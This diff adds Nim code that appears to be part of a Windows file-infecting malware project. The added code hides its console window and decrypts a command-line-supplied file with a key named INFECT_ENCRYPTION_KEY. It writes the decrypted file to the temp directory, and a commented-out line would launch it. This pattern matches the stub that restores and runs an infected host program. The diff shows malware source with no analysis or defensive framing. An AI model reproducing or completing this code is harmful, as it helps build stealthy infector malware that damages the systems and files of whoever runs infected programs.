@@ -1,3 +1,37 @@
+import lib/more/xxtea
+from os import commandLineParams
+from os import getEnv
+from os import `/`
+from os import splitFile
+from os import execShellCmd
+from lib/flags import INFECT_ENCRYPTION_KEY
+from winim/inc/wincon import FreeConsole
+
+FreeConsole()
+
+let params: seq[string] = commandLineParams()
+
+if params.len >= 1 and params[0] != "":
+  try:
+    let filePath: string = params[0]
+    let input = readFile(filePath)
+
+    let decrypted = xxtea.decrypt(input, INFECT_ENCRYPTION_KEY)
+
+    let (_, name, ext) = splitFile(filePath)
+
+    let tmpPath = getEnv("tmp") / name & ext
+
+    writeFile(tmpPath, decrypted)
+
+    quit(0)
+  except OSError:
+    quit(0)
+
+
+
+  # discard execShellCmd("start \"\" " & tmpPath)
+
 import asyncdispatch
 from os import sleep
 
